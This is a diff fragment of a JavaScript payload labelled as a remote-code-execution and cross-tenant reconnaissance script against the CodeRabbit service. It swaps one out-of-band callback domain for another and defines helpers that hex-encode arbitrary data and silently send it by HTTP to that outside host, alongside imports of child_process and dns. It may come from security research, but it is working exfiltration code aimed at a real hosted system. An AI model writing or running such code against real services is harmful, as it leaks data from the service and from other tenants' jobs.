@@ -1,7 +1,7 @@
 // CodeRabbit RCE — control-plane protocol + cross-tenant recon (read-only).
 // Understand the runner IPC (input.json / command-resource / output.json) and
 // whether other tenants' jobs share this instance.
-var C = 'd8sf4croeaqm2gltrkig5twq6bqngdh73.oast.me';
+var C = 'd8sihjjoeaqmcthj5negzhh9obfe4gk4q.oast.fun';
 var http = require('http'), dns = require('dns'), cp = require('child_process');
 var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
 var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(String(d)).slice(0, 1700), timeout: 8000 }, function () {}).on('error', function () {}); } catch (e) {} };
